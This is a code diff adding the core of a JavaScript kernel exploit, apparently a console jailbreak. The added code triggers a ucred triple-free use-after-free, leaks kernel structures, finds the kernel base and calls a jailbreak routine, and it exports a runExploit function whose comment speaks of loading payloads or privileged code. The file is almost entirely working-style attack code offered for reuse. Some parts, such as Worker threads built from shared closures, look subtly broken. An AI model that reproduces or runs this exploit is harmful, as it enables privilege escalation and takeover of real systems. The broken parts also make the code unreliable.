@@ -782,4 +782,204 @@ class ExploitNetControlImpl {
     }
 
     kwriteSlow8(addr, value) {
-        const
+        const buffer = new ArrayBuffer(1);
+        const view = new DataView(buffer);
+        view.setUint8(0x00, value);
+        this.kwriteSlow(addr, buffer);
+    }
+
+    exploit() {
+        try {
+            // Set main core
+            this.cpusetSetAffinity(this.MAIN_CORE);
+            this.rtprioThread(0xFF);
+
+            this.log("Starting exploit...");
+
+            // Trigger UAF
+            this.triggerUcredTripleFree();
+
+            // Leak kqueue
+            this.leakKqueue();
+
+            // Find allproc
+            this.allproc = this.findAllProc();
+            this.log("allproc: 0x" + this.allproc.toString(16));
+
+            // Find fdt_ofiles
+            const initproc = this.pfind(1);
+            this.log("initproc: 0x" + initproc.toString(16));
+
+            const init_p_fd = this.kreadSlow64(initproc + 0x48n);
+            this.log("init_p_fd: 0x" + init_p_fd.toString(16));
+
+            this.fdt_ofiles = this.kreadSlow64(init_p_fd + 0x00n);
+            this.log("fdt_ofiles: 0x" + this.fdt_ofiles.toString(16));
+
+            // Remove RTHDR references from sockets
+            this.removeRthrFromSocket(this.ipv6Socks[this.triplets[0]]);
+            this.removeRthrFromSocket(this.ipv6Socks[this.triplets[1]]);
+            this.removeRthrFromSocket(this.ipv6Socks[this.triplets[2]]);
+
+            // Remove UAF file
+            this.removeUafFile();
+
+            // Get kernel base
+            const kernelBase = this.kreadSlow64(this.kq_fdp) - 0x133b38n;
+            this.log("kernelBase: 0x" + kernelBase.toString(16));
+
+            // Jailbreak the system
+            this.jailbreak();
+            this.log("Jailbreak complete!");
+
+            // Cleanup
+            this.cleanup();
+
+            return true;
+        } catch (e) {
+            this.log("Exploit failed: " + e.toString());
+            return false;
+        }
+    }
+
+    cleanup() {
+        // Close all sockets
+        for (let i = 0; i < this.ipv6Socks.length; i++) {
+            this.close(this.ipv6Socks[i]);
+        }
+
+        // Close socket pairs
+        this.close(this.uioSs0);
+        this.close(this.uioSs1);
+        this.close(this.iovSs0);
+        this.close(this.iovSs1);
+
+        // Terminate threads
+        for (let i = 0; i < this.iovThreads.length; i++) {
+            this.iovThreads[i].terminate();
+        }
+
+        for (let i = 0; i < this.uioThreads.length; i++) {
+            this.uioThreads[i].terminate();
+        }
+    }
+}
+
+// Worker state management
+class WorkerState {
+    constructor(threadNum) {
+        this.threadNum = threadNum;
+        this.work = new Int32Array(new SharedArrayBuffer(4));
+        this.finished = new Int32Array(new SharedArrayBuffer(4));
+    }
+
+    signalWork(value) {
+        Atomics.store(this.work, 0, value);
+        Atomics.notify(this.work, 0);
+    }
+
+    waitForWork() {
+        while (Atomics.load(this.work, 0) === 0) {
+            Atomics.wait(this.work, 0, 0);
+        }
+        return Atomics.exchange(this.work, 0, 0);
+    }
+
+    signalFinished() {
+        Atomics.add(this.finished, 0, 1);
+        if (Atomics.load(this.finished, 0) === this.threadNum) {
+            Atomics.notify(this.finished, 0);
+        }
+    }
+
+    waitForFinished() {
+        while (Atomics.load(this.finished, 0) !== this.threadNum) {
+            Atomics.wait(this.finished, 0, 0);
+        }
+        Atomics.store(this.finished, 0, 0);
+    }
+}
+
+// Thread implementations
+class IovThread {
+    constructor(state, exploit) {
+        this.state = state;
+        this.exploit = exploit;
+        this.running = false;
+    }
+
+    start() {
+        this.running = true;
+        const self = this;
+        this.worker = new Worker(function() {
+            while (self.running) {
+                const work = self.state.waitForWork();
+                if (work === 0) {
+                    // Send message
+                    self.exploit.sendmsg(self.exploit.iovSs1, self.exploit.msg, 0);
+                }
+                self.state.signalFinished();
+            }
+        });
+    }
+
+    terminate() {
+        this.running = false;
+    }
+}
+
+class UioThread {
+    constructor(state, exploit) {
+        this.state = state;
+        this.exploit = exploit;
+        this.running = false;
+    }
+
+    start() {
+        this.running = true;
+        const self = this;
+        this.worker = new Worker(function() {
+            while (self.running) {
+                const work = self.state.waitForWork();
+                if (work === self.exploit.COMMAND_UIO_READ) {
+                    // Perform UIO read
+                    self.exploit.readv(self.exploit.uioSs1, self.exploit.msgIov, self.exploit.UIO_IOV_NUM);
+                } else if (work === self.exploit.COMMAND_UIO_WRITE) {
+                    // Perform UIO write
+                    self.exploit.writev(self.exploit.uioSs1, self.exploit.msgIov, self.exploit.UIO_IOV_NUM);
+                }
+                self.state.signalFinished();
+            }
+        });
+    }
+
+    terminate() {
+        this.running = false;
+    }
+}
+
+// Main execution entry point
+function runExploit() {
+    try {
+        const exploit = new ExploitNetControlImpl();
+        if (exploit.exploit()) {
+            console.log("Exploit successful - system jailbroken!");
+            // At this point, you could load payloads or execute privileged code
+            return true;
+        } else {
+            console.log("Exploit failed");
+            return false;
+        }
+    } catch (e) {
+        console.error("Exploit execution error: " + e.toString());
+        return false;
+    }
+}
+
+// Export for use in other modules
+if (typeof module !== 'undefined' && module.exports) {
+    module.exports = {
+        ExploitNetControlImpl,
+        runExploit
+    };
+}
